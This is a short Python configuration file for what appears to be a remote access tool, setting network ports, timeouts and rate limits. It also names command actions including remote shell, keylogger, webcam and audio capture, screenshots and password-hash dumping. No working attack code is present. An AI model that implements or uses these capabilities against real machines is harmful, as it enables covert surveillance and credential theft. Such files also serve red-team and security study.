# Network
DEFAULT_HOST = "0.0.0.0"
DEFAULT_CLIENT_HOST = "127.0.0.1"
DEFAULT_PORT = 8443
CONNECT_TIMEOUT_SEC = 10.0
SOCKET_TIMEOUT_SEC = 30.0
READ_TIMEOUT_SEC = 60.0

# Reconnection
MAX_RETRIES = 3
RETRY_DELAY = 5
RETRY_DELAY_MAX = 60
RETRY_BACKOFF_FACTOR = 2.0

# Communication
BUFFER_SIZE = 4096
LENGTH_PREFIX_BYTES = 4
MAX_MESSAGE_BYTES = 16 * 1024 * 1024
PROTOCOL_VERSION = "1.0"

# File transfer limits (protect server from memory exhaustion)
# Default max file size in bytes (50 MB)
# Can be changed at runtime via the 'configure' command
MAX_FILE_SIZE_BYTES = 50 * 1024 * 1024

# Connection rate limiting (protect server from DoS)
# Maximum new connections per IP per minute
MAX_CONNECTIONS_PER_IP_PER_MINUTE = 10
# Maximum concurrent connections from a single IP
MAX_CONCURRENT_CONNECTIONS_PER_IP = 5
# Maximum total concurrent connections
MAX_TOTAL_CONNECTIONS = 100
# Seconds to ban an IP after exceeding rate limits
RATE_LIMIT_BAN_SECONDS = 60

HANDSHAKE_ACTION = "handshake"
TEST_ACTION = "test"
HELP_ACTION = "help"
DOWNLOAD_ACTION = "download"
UPLOAD_ACTION = "upload"
SHELL_ACTION = "shell"
SCREENSHOT_ACTION = "screenshot"
KEYLOGGER_ACTION = "keylogger"
WEBCAM_SNAPSHOT_ACTION = "webcam_snapshot"
WEBCAM_STREAM_ACTION = "webcam_stream"
HASHDUMP_ACTION = "hashdump"
IPCONFIG_ACTION = "ipconfig"
RECORD_AUDIO_ACTION = "record_audio"
SEARCH_ACTION = "search"

# OS Types
OS_WINDOWS = "windows"
OS_LINUX = "linux"
OS_DARWIN = "darwin"
OS_UNKNOWN = "unknown"
